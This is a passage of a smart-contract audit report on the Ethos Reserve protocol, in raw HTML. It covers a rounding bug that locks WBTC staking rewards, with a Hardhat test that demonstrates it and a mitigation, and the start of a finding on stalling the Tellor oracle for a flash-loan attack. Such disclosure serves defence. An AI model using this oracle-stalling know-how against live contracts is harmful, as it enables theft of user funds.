        </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk8\">&quot;Not enough funds&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span></code></pre>\n<p>Also, <code>shares</code> can be updated according to the real value obtained as it is done in yearn:</p>\n<p><a href=\"https://github.com/yearn/yearn-vaults/blob/master/contracts/Vault.vy#L1147-L1151\">https://github.com/yearn/yearn-vaults/blob/master/contracts/Vault.vy#L1147-L1151</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> </span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt; vault_balance:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">value</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vault_balance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            # NOTE: </span><span class=\"mtk12\">Burn</span><span class=\"mtk1\"> # </span><span class=\"mtk4\">of</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> </span><span class=\"mtk12\">that</span><span class=\"mtk1\"> </span><span class=\"mtk12\">corresponds</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">what</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Vault</span><span class=\"mtk1\"> </span><span class=\"mtk12\">has</span><span class=\"mtk1\"> </span><span class=\"mtk12\">on</span><span class=\"mtk1\">-</span><span class=\"mtk12\">hand</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            #       </span><span class=\"mtk12\">including</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">losses</span><span class=\"mtk1\"> </span><span class=\"mtk12\">that</span><span class=\"mtk1\"> </span><span class=\"mtk12\">were</span><span class=\"mtk1\"> </span><span class=\"mtk12\">incurred</span><span class=\"mtk1\"> </span><span class=\"mtk12\">above</span><span class=\"mtk1\"> </span><span class=\"mtk12\">during</span><span class=\"mtk1\"> </span><span class=\"mtk12\">withdrawals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">self</span><span class=\"mtk1\">.</span><span class=\"mtk11\">_sharesForAmount</span><span class=\"mtk1\">(</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">totalLoss</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/723#issuecomment-1466668885\">tess3rac7 (Ethos Reserve) confirmed via duplicate issue <code>#723</code></a></strong></p>\n<hr>\n<h2 id=\"h-03-rewards-will-be-locked-in-lqtystaking-contract\" style=\"position:relative;\"><a href=\"#h-03-rewards-will-be-locked-in-lqtystaking-contract\" aria-label=\"h 03 rewards will be locked in lqtystaking contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/285\">[H-03] Rewards will be locked in LQTYStaking Contract</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/285\">gjaldon</a>, also found by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/482\">0xBeirao</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/304\">hyh</a>, and <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/111\">0xRobocop</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/LQTY/LQTYStaking.sol#L181-L183\">https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/LQTY/LQTYStaking.sol#L181-L183</a><br>\n<a href=\"https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/RedemptionHelper.sol#L191-L197\">https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/RedemptionHelper.sol#L191-L197</a><br>\n<a href=\"https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/ActivePool.sol#L296-L300\">https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/ActivePool.sol#L296-L300</a></p>\n<p>The state variable <code>F_Collateral</code> in the LQTYStaking contract is used to keep track of rewards for each of the collateral types used in the protocol. Every time the LQTYStaking contract is sent collateral assets for rewards by the ActivePool or the RedemptionHelper, <code>LQTYStaking.increaseF_Collateral</code> is called to record the rewards that are to be distributed to stakers.</p>\n<p>However, if the state variable <code>totalLQTYStaked</code> is large enough in the LQTYStaking contract, zero rewards will be distributed to stakers even though LQTYStaking received assets. This issue is exarcebated when using WBTC as collateral due to its low number of decimals.</p>\n<p>For example, given the following:</p>\n<ol>\n<li><code>totalLQTYStaked</code> = 1e25; LQTY/OATH token has 18 decimals; this means that a total of 10million LQTY has been staked</li>\n<li>A redemption rate of 0.5% was applied on a redemption of 10e8 WBTC. This leads to a redemption fee of 5e6 WBTC that is sent to the LQTYStaking contract. This happens in <a href=\"https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/RedemptionHelper.sol#L190-L197\">this code</a>.</li>\n<li>Given the above, RedemptionHelper calls <code>LQTYStaking.increaseF_Collateral(WBTCaddress, 5e6)</code></li>\n</ol>\n<p>The issue is in this line in <code>increaseF_Collateral</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">totalLQTYStaked</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span><span class=\"mtk12\">collFeePerLQTYStaked</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_collFee</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DECIMAL_PRECISION</span><span class=\"mtk1\">).</span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span><span class=\"mtk12\">totalLQTYStaked</span><span class=\"mtk1\">);}</span></span></span></code></pre>\n<p><code>_collFee</code> = 5e6; <code>DECIMAL_PRECISION</code> = 1e18; <code>totalLQTYStaked</code> = 1e25</p>\n<p>If we substitute the variables with the actual values and represent the code in math, it looks like:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">(5e6 * 1e18) / 1e25 = 5e24 / 1e25 = 0.5</span></span></code></pre>\n<p>Since the result of that math is a value less than 1 and in Solidity/EVM we only deal with integers and division rounds down, we get 0 as a result. That means the below code will only add <code>0</code> to <code>F_Collateral</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">F_Collateral</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">F_Collateral</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collFeePerLQTYStaked</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>So even though LQTYStaking received 5e6 WBTC in redemption fee, that fee will never be distributed to stakers and will remain forever locked in the LQTYStaking contract. The minimum amount of redemption fee that is needed for the reward to be recognized and distributed to stakers is 1e7 WBTC. That means at least 0.1 BTC in collateral fee is needed for the rewards to be distributed when there is 1Million total LQTY staked.</p>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>This leads to loss of significant rewards for stakers. These collateral assets that are not distributed as rewards will remain forever locked in LQTYStaking.</p>\n<p>If 1e25 LQTY is staked in LQTYStaking (10M LQTY), at least 1e7 (0.1) WBTC in redemption fee must be sent by the RedemptionHelper for that WBTC to be sent as rewards to the stakers. That means only redemptions of 20e8 (20) WBTC and more will lead to redemption fees high enough to be distributed as rewards to stakers. Redemption of 20e8 WBTC will rarely happen, so it’s likely that majority of rewards will be forever locked since most redemptions will be less than that.</p>\n<p>Given the above, if only 3% of redemptions have amounts of 20e8 WBTC or greater, then 97% of redemptions will have their fees forever locked in the contract. The greater the amount of LQTY Staked, the higher the amount needed for the fees to be recorded.</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>First, comment out <a href=\"https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/LQTY/LQTYStaking.sol#L178\">this line</a> in <code>increaseF_Collateral</code> to disable the access control. This allows us to write a more concise POC. It is fine since the issue has nothing to do with access control.</p>\n<p>Add the following test case to the <code>Ethos-Core/test/LQTYStakingFeeRewardsTest.js</code> file after the <code>beforeEach</code> clause:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;does not increase F collateral even with large amount of collateral fee&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakingToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">A</span><span class=\"mtk1\">, </span><span class=\"mtk11\">dec</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10_000_000</span><span class=\"mtk1\">, </span><span class=\"mtk7\">18</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakingToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lqtyStaking</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">dec</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10_000_000</span><span class=\"mtk1\">, </span><span class=\"mtk7\">18</span><span class=\"mtk1\">), {</span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">A</span><span class=\"mtk1\">})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lqtyStaking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stake</span><span class=\"mtk1\">(</span><span class=\"mtk11\">dec</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10_000_000</span><span class=\"mtk1\">, </span><span class=\"mtk7\">18</span><span class=\"mtk1\">), {</span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">A</span><span class=\"mtk1\">})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wbtc</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collaterals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oldWBTC_FCollateral</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lqtyStaking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">F_Collateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wbtc</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// .09 WBTC in redemption/collateral fee will not be distributed as reward to stakers</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lqtyStaking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increaseF_Collateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wbtc</span><span class=\"mtk1\">, </span><span class=\"mtk11\">dec</span><span class=\"mtk1\">(</span><span class=\"mtk7\">9</span><span class=\"mtk1\">, </span><span class=\"mtk7\">6</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">assert</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isTrue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">oldWBTC_FCollateral</span><span class=\"mtk1\">.</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lqtyStaking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">F_Collateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wbtc</span><span class=\"mtk1\">)))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// at least 0.1 WBTC in redemption/collateral fee is needed for it to be distributed as reward to stakers</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lqtyStaking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increaseF_Collateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wbtc</span><span class=\"mtk1\">, </span><span class=\"mtk11\">dec</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">7</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">assert</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isTrue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">oldWBTC_FCollateral</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lt</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lqtyStaking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">F_Collateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wbtc</span><span class=\"mtk1\">)))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  })</span></span></span></code></pre>\n<p>The test can then be run with the following command:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">$ npx hardhat test --grep &quot;does not increase F collateral even with large amount of collateral fee&quot;</span></span></code></pre>\n<h3 id=\"recommended-mitigation-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-1\" aria-label=\"recommended mitigation 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation</h3>\n<p>One way to address this issue is to use the same error-recording logic found in the <code>_computeLQTYPerUnitStaked</code> logic that looks like:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">LQTYNumerator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_LQTYIssuance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DECIMAL_PRECISION</span><span class=\"mtk1\">).</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lastLQTYError</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">LQTYPerUnitStaked</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">LQTYNumerator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_totalLUSDDeposits</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">lastLQTYError</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">LQTYNumerator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LQTYPerUnitStaked</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_totalLUSDDeposits</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p>The <code>lastLQTYError</code> state variable stores the LQTY issuance that was not distributed since they were just rounded off. The same approach can be used in <code>increaseF_Collateral</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/285#issuecomment-1516724948\">tess3rac7 (Ethos Reserve) confirmed</a></strong></p>\n<hr>\n<h1 id=\"medium-risk-findings-14\" style=\"position:relative;\"><a href=\"#medium-risk-findings-14\" aria-label=\"medium risk findings 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (14)</h1>\n<h2 id=\"m-01-low-data-feed-frequency-from-tellor-makes-your-protocol-vulnerable-to-flash-loan-attacks\" style=\"position:relative;\"><a href=\"#m-01-low-data-feed-frequency-from-tellor-makes-your-protocol-vulnerable-to-flash-loan-attacks\" aria-label=\"m 01 low data feed frequency from tellor makes your protocol vulnerable to flash loan attacks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/772\">[M-01] Low data feed frequency from Tellor makes your protocol vulnerable to flash loan attacks</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/772\">peritoflores</a></em></p>\n<p>An attacker can stale Tellor Oracle for several hours cheaply and perform a flash loan attack to profit.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>To explain this issue I will first compare Chainlink to Tellor.</p>\n<p>Most ERC-20 tokens are in general much more volatile than ETH and BTC. In Chainlink,  there are triggers of 0,5% for BTC and ETH and 1% for other assets. This is to ensure that you are cutting error by those values.</p>\n<p>Tellor, on the other hand, is an <em>optimistic oracle</em>. Stakers use the oracle system to put data on chain <code>submitValue(..)</code> that are directly shown in the oracle. The security lies the fact that data consumers should wait some <strong>dispute windows</strong> in order to give time to others to dispute data and remove incorrect or malicious data.</p>\n<p>This is what happened in a Liquity bug found last year, they were reading instant data.[2]</p>\n<p>Being explained this and back to your code you have essentially two bugs</p>\n<h3 id=\"first-bug-default-disputetime--20-minutes\" style=\"position:relative;\"><a href=\"#first-bug-default-disputetime--20-minutes\" aria-label=\"first bug default disputetime  20 minutes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>First bug: Default disputetime = 20 minutes</h3>\n<p>In <code>TellorCaller.sol</code> you have the following statement</p>\n<p><code>(bytes memory data, uint256 timestamp) = getDataBefore(_queryId, block.timestamp - 20 minutes)</code></p>\n<p>Maybe you are using 20 minutes because this is the default value in Tellor documentation. However, in Liquity they are using 15 minutes for ETH because they say that have been made an analysis of ETH volatility behaviour.[2]</p>\n<p>Basically there is a tradeoff between the volatility of an asset and the dispute time. More time is safer to have time to dipute but more likely to read a so old value.  Less dispute time you have less error but no time to dispute can put you at risk of reading a manipulated value.</p>\n<p>In your case, you are using more volatile assets so in theory, if Liquity analysis is correct, you should be using less time for ERC20 assets.</p>\n<p>Of course this requires a deeper analysis but I am not doing it because the second bug makes this unnecessary as it has a higher impact.</p>\n<h3 id=\"second-bug-data-feed-frequency-in-tellor-is-very-low-so-it-is-cheap-to-break\" style=\"position:relative;\"><a href=\"#second-bug-data-feed-frequency-in-tellor-is-very-low-so-it-is-cheap-to-break\" aria-label=\"second bug data feed frequency in tellor is very low so it is cheap to break permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Second bug: Data feed frequency in Tellor is very low so it is cheap to break</h3>\n<p>I will briefly explain some Tellor security designs.</p>\n<p>Tellor bases his security design in an exponential cost to dispute. They have a several-round voting to dispute a single value but we are interested in the <em>Cost of Stalling</em> (CoS) the System.</p>\n<p>To stale the system we need to dipute every single value for a given period, for a given asset.</p>\n<p>According to whitepaper cost starts at  <code>baseFee</code>  and increase with the following formula</p>\n<p><code>𝑑𝑖𝑠𝑝𝑢𝑡𝑒𝐹𝑒𝑒𝑖𝑑,𝑡,𝑟>1 = 